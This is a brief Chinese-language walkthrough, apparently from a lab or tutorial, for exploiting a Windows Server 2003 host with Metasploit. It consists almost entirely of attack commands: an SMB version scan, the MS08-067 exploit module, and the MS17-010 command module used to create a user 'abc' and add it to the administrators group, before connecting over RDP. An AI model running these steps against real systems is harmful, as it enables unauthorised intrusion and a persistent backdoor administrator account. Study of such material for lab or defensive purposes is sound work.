1.2 攻击利用方式一

1.判断服务器操作系统

服务器为window2003

use auxiliary/scanner/smb/smb_version
set rhost 192.168.1.8
run

2. 使用MS08_067测试

use exploit/windows/smb/ms08_067_netapi
set rhost 192.168.1.8
set target 74
run

3.使用MS17-010测试

添加普通用户abc

use auxiliary/admin/smb/ms17_010_command
set rhosts 192.168.1.8
set command net user abc abc123 /add
run

4.用户添加到administrators组

set command net localgroup administrators abc /add
run

5.使用RDP连接远程主机
